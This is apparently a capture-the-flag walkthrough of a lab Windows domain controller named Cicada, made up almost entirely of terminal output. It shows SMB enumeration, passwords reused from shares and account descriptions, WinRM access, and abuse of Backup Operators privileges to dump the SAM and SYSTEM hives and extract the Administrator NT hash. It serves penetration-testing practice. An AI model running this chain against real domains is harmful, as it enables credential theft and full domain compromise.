

```
kali@kali ~> nmap -sC -sV -Pn 10.129.189.129
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 17:24 EDT
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.00% done; ETC: 17:25 (0:00:04 remaining)
Nmap scan report for 10.129.189.129
Host is up (0.078s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 04:25:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-09-29T04:25:49
|_  start_date: N/A

```



```
kali@kali ~> nxc smb cicada.htb -u 'GUest' -p '' --shares
SMB         10.129.189.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.189.129  445    CICADA-DC        [+] cicada.htb\GUest:
SMB         10.129.189.129  445    CICADA-DC        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.129.189.129  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.189.129  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.189.129  445    CICADA-DC        -----           -----------     ------
SMB         10.129.189.129  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.189.129  445    CICADA-DC        C$                              Default share
SMB         10.129.189.129  445    CICADA-DC        DEV
SMB         10.129.189.129  445    CICADA-DC        HR              READ
SMB         10.129.189.129  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.189.129  445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.129.189.129  445    CICADA-DC        SYSVOL                          Logon server share
kali@kali ~> smbclient \\\\cicada.htb\\HR -U "Guest%"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 331330 blocks available
smb: \> download "Notice from HR.txt "
download: command not found
smb: \> get "Notice from HR.txt "
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Notice from HR.txt
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
smb: \> exit
kali@kali ~> cat "Notice from HR.txt"

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```


```
kali@kali ~> nxc smb cicada.htb -u 'GUest' -p '' --rid-brute
SMB         10.129.189.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.189.129  445    CICADA-DC        [+] cicada.htb\GUest:
SMB         10.129.189.129  445    CICADA-DC        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.129.189.129  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```


```
kali@kali ~> nxc smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --rid-brute
SMB         10.129.189.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.189.129  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.129.189.129  445    CICADA-DC        [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.129.189.129  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.189.129  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.189.129  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.189.129  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```


```
kali@kali ~> nxc smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.189.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.189.129  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.129.189.129  445    CICADA-DC        [-] Account not found in the BloodHound database.
SMB         10.129.189.129  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.189.129  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain
SMB         10.129.189.129  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain
SMB         10.129.189.129  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account
SMB         10.129.189.129  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 4
SMB         10.129.189.129  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 4
SMB         10.129.189.129  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0
SMB         10.129.189.129  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 4       Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         10.129.189.129  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 4
```


```
kali@kali ~> nxc smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.189.129  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.189.129  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
SMB         10.129.189.129  445    CICADA-DC        [-] Account not found in the BloodHound database.
SMB         10.129.189.129  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.189.129  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.189.129  445    CICADA-DC        -----           -----------     ------
SMB         10.129.189.129  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.189.129  445    CICADA-DC        C$                              Default share
SMB         10.129.189.129  445    CICADA-DC        DEV             READ
SMB         10.129.189.129  445    CICADA-DC        HR              READ
SMB         10.129.189.129  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.189.129  445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.129.189.129  445    CICADA-DC        SYSVOL          READ            Logon server share

```


```
kali@kali ~> cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```


```
*Evil-WinRM* PS C:\> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```



```
kali@kali ~> reg.py cicada.htb/'emily.oscars':'Q!3@Lp#M6b*7t*Vt'@10.129.189.129 backup -o '\\\\10.129.189.129\\C$\\temp'
/usr/local/bin/reg.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'reg.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.129.189.129\C$\temp\SAM.save
[*] Saved HKLM\SYSTEM to \\10.129.189.129\C$\temp\SYSTEM.save
[*] Saved HKLM\SECURITY to \\10.129.189.129\C$\temp\SECURITY.save

```


```
kali@kali ~> secretsdump.py -sam 'SAM.save' -system 'SYSTEM.save' LOCAL
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'secretsdump.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```



https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
https://tools.thehacker.recipes/mimikatz/modules/privilege/backup
https://github.com/giuliano108/SeBackupPrivilege
https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/